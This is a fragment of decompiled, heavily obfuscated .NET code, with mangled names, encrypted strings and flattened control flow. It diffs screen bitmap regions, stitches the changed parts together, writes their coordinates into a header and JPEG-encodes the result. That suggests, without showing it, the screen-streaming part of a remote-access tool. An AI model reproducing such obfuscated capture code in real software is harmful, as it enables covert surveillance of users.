				}
				goto IL_522;
				IL_5D5:
				Bitmap arg_5F1_0 = _____________________________.__________;
				rect = new Rectangle(x, num15, num11, num7);
				bitmap2 = arg_5F1_0.Clone(rect, bitmap3.PixelFormat);
				arg_600_0 = System.Type.EmptyTypes.Length + 6;
				goto IL_600;
				IL_645:
				_____________________________.______________ = int_0;
				_____________________________._______________ = int_1;
				_____________________________.________________ = int_2;
				list = new System.Collections.Generic.List<Bitmap>();
				int num19 = ______________________._______;
				num3 = sizeof(byte) + -26342;
				int num20 = <Module>.___________;
				arg_600_0 = (((num20 / 323590 & 134217728 * num20 / 268435456) == -2073112277) ? (((6720 ^ num2 << 16) - 576863472 == (int)((uint)(num7 % 29037696) >> 25)) ? (System.Type.EmptyTypes.Length + 1302781776) : (sizeof(System.Guid) + 1876735659)) : (System.Type.EmptyTypes.Length + 11));
				goto IL_600;
			}
			IL_7B0:
			array[0] = 0;
			result = array;
			return result;
			IL_7BB:
			Bitmap bitmap4 = new Bitmap(list[0].Width, num4);
			Graphics graphics = Graphics.FromImage(bitmap4);
			num6 = 0;
			string text = Conversions.ToString(bitmap3.Width) + <Module>._____<string>(116858529u) + Conversions.ToString(bitmap3.Height) + <Module>.____<string>(3252270184u);
			try
			{
				if ((num4 / 1071270581 | -5041) == -5041)
				{
					goto IL_9DA;
				}
				IL_9A6:
				int current;
				graphics.DrawImage(list[current], 0, num6);
				num6 += list[current].Height;
				IL_9CC:
				System.Collections.Generic.List<int>.Enumerator enumerator;
				if (!enumerator.MoveNext())
				{
					goto IL_9F5;
				}
				current = enumerator.Current;
				int num21 = -11144;
				int num12;
				if (num12 + -1744830464 != num12)
				{
					string[] array2 = new string[7];
					array2[0] = text;
					int arg_98C_0 = sizeof(uint) + -1;
					while (true)
					{
						switch (arg_98C_0)
						{
						case 0:
						{
							array2[2] = <Module>.______<string>(1060962588u);
							string[] arg_955_0 = array2;
							int arg_955_1 = 3;
							Point item = list2[current];
							arg_955_0[arg_955_1] = Conversions.ToString(item.Y);
							int num15;
							int num19;
							arg_98C_0 = ((num19 / 6876 - -2147483648 == (9989 & num15 % 65536) << 20) ? (System.Type.EmptyTypes.Length + -2037812868) : (System.Type.EmptyTypes.Length + 1));
							continue;
						}
						case 1:
							goto IL_8B3;
						case 2:
							array2[6] = <Module>.___<string>(4063101107u);
							text = string.Concat(array2);
							if (num21 != -1182)
							{
								goto IL_8B3;
							}
							goto IL_9A6;
						}
						array2[1] = Conversions.ToString(list2[current].X);
						arg_98C_0 = sizeof(float) + -4;
						continue;
						IL_8B3:
						array2[4] = <Module>._______<string>(1916090129u);
						array2[5] = Conversions.ToString(list[current].Height);
						int num;
						int num9;
						int num11;
						num21 = ((31348 + (num9 << 2) == 14444 * num9) ? ((((num & 3944) - -(num11 | 6829) & 328384003) == 0) ? -1448105739 : (System.Type.EmptyTypes.Length + 1975909300)) : -1182);
						arg_98C_0 = System.Type.EmptyTypes.Length + 2;
					}
				}
				IL_9DA:
				enumerator = list3.GetEnumerator();
				goto IL_9CC;
			}
			finally
			{
				System.Collections.Generic.List<int>.Enumerator enumerator;
				((System.IDisposable)enumerator).Dispose();
			}
			IL_9F5:
			int num22 = <Module>._____________;
			int num23;
			int num24;
			int arg_BD2_0;
			if ((num22 << 20) + -(num22 * 37 + num22 * 91) != 7320)
			{
				text += <Module>.____<string>(2986380471u);
				int arg_A39_0 = 0;
				num23 = list.Count - 1;
				num24 = arg_A39_0;
				arg_BD2_0 = System.Type.EmptyTypes.Length + 3;
				goto IL_BD2;
			}
			EncoderParameters encoderParameters;
			int num25;
			do
			{
				IL_AE8:
				encoderParameters = new EncoderParameters(1);
				encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)int_2);
				int num2;
				if (num2 + 2717 == (int)((uint)(num2 * -663060480) >> 15))
				{
					break;
				}
			}
			while (num25 == 3968);
			ImageCodecInfo encoder = _____________________________._________________(<Module>._____<string>(810845712u));
			System.IO.MemoryStream memoryStream2;
			bitmap4.Save(memoryStream2, encoder, encoderParameters);
			if ((num22 << 27 & 100663296) != (1610612736 * num22 & 100663296))
			{
				int arg_B64_0 = -1073741824;
				int num26 = <Module>.______________;
				if (arg_B64_0 + num26 * 32 != num26 << 5)
				{
					int num27 = global::___________._;
					arg_BD2_0 = ((~(-(num27 * -1503395840)) == 262144 * num27) ? 1495682746 : (System.Type.EmptyTypes.Length + -1508614911));
				}
				else
				{
					arg_BD2_0 = ((2 * ((5164 & num25) - 4776) + -1641590910 == num25 * 3 + num25) ? checked((int)(unchecked((System.IntPtr)1428674749))) : 1110271699);
				}
			}
			else
			{
				arg_BD2_0 = System.Type.EmptyTypes.Length + 1;
			}
			while (true)
			{
				IL_BD2:
				switch (arg_BD2_0)
				{
				case 0:
					goto IL_AE8;
				case 1:
					goto IL_BF0;
				case 2:
					goto IL_A95;
				}
				if (num24 > num23)
				{
					graphics.Dispose();
					memoryStream2 = new System.IO.MemoryStream();
					num25 = System.Type.EmptyTypes.Length + -1277;
					arg_BD2_0 = System.Type.EmptyTypes.Length + 0;
					continue;
				}
				if (!list3.Contains(num24))
				{
					_____________________________.________.Add(list[num24]);
					goto IL_A95;
				}
				IL_AA8:
				num24++;
				int num18;
				arg_BD2_0 = ((436207616 * (num18 * 19 + num18 * 13) == -7351) ? (System.Type.EmptyTypes.Length + -812722862) : 4);
				continue;
				IL_A95:
				_____________________________._________.Add(list2[num24]);
				goto IL_AA8;
			}
			IL_BF0:
			System.IO.MemoryStream memoryStream3 = new System.IO.MemoryStream();
			memoryStream3.Write(System.Text.Encoding.Default.GetBytes(text), 0, text.Length);
			memoryStream3.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
			_____________________________.__________ = bitmap3;
			bitmap4.Dispose();
			result = memoryStream3.ToArray();
		}
		catch (System.Exception arg_C41_0)
		{
			ProjectData.SetProjectError(arg_C41_0);
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
